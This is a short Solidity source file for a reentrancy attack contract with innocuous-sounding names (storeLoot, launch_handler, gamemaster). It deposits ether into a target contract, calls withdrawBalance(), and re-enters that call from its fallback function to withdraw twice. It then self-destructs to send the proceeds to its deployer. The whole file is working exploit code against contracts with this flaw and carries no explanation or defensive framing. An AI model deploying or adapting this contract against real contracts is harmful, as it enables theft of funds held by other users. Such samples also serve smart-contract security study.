pragma solidity ^0.4.15;

contract GoldvaultOperator {
    bool public operationActive=false;
    address public target_contract;
    address public gamemaster;

    function GoldvaultOperator() public{
        gamemaster = msg.sender;
    }

    function storeLoot(address _target_contract) public payable{
        target_contract = _target_contract ;

        require(target_contract.call.value(msg.value)(bytes4(sha3("addToBalance()"))));
    }

    function launch_handler() public{
        operationActive = true;


        require(target_contract.call(bytes4(sha3("withdrawBalance()"))));
    }

    function () public payable{

        if (operationActive){
            operationActive = false;
                require(target_contract.call(bytes4(sha3("withdrawBalance()"))));
        }
    }

    function get_money(){
        suicide(gamemaster);
    }

}